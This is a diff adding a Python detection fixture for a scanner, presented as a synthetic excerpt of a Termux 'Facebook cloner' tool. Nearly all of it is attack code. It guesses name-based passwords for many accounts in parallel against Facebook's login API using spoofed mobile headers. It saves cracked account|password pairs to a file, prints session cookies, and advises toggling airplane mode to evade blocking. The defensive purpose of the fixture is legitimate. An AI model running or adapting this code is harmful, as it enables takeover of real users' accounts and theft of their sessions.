@@ -1,0 +1,70 @@
+# Synthetic but representative excerpt of a Termux "Facebook cloner" script.
+# Used as a detection fixture for ClonerHunter's self-check and unit tests.
+import os, base64, uuid, requests
+from concurrent.futures import ThreadPoolExecutor as speed
+
+os.system('git pull -q;rm .rndm')
+
+def oo(t):
+    return '\033[1;91m[\033[1;97m' + str(t) + '\033[1;91m]\033[1;97m '
+
+accounts = []
+okacc = []
+cpacc = []
+
+def menu():
+    print("1) FILE CLONING")
+    print("2) PAK RANDOM CLONING")
+    print("3) GMAIL CLONING")
+
+def method():
+    print('ON OFF AEROPLANE MODE AFTER EVERY 5 MINUTES')
+    print('FILE SAVE IN /sdcard/AHMADO-OK.txt')
+
+    def start(user):
+        r = requests.Session()
+        acc, name = user.split("|")
+        first = name.rsplit(" ")[0]
+        last = name.rsplit(" ")[1]
+        ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ2A.230505.002)"])
+        header = {
+            "Content-Type": "application/x-www-form-accencoded",
+            "Host": "graph.facebook.com",
+            "User-Agent": ua,
+            "X-FB-Net-HNI": "45204",
+            "X-FB-SIM-HNI": "45201",
+            "x-fb-session-id": "nid=abc;pid=Main",
+            "X-FB-Friendly-Name": "ViewerReactionsMutation",
+            "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
+        }
+        for pword in totalpass:
+            pword = pword.replace("first", first).replace("last", last)
+            pword = pword.lower()
+            data = {
+                "adid": str(uuid.uuid4()),
+                "credentials_type": "device_based_login_password",
+                "source": "device_based_login",
+                "email": acc,
+                "password": pword,
+                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+                "generate_session_cookies": "1",
+                "method": "auth.login",
+                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                "api_key": "882a8490361da98702bf97a021ddc14d",
+            }
+            response = r.post('https://b-graph.facebook.com/auth/login',
+                              data=data, headers=header, allow_redirects=False)
+            if 'session_key' in response.text:
+                okacc.append(acc)
+                open('/sdcard/AHMADO-OK.txt', 'a').write(acc + ' | ' + pword + '\n')
+                q = json.loads(response.text)
+                ckkk = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
+                ssbb = base64.b64encode(os.urandom(18)).decode()
+                print("sb=" + ssbb + ";" + ckkk)
+                break
+            elif 'checkpoint' in response.text:
+                cpacc.append(acc)
+                break
+
+    with speed(max_workers=30) as speede:
+        speede.map(start, accounts)
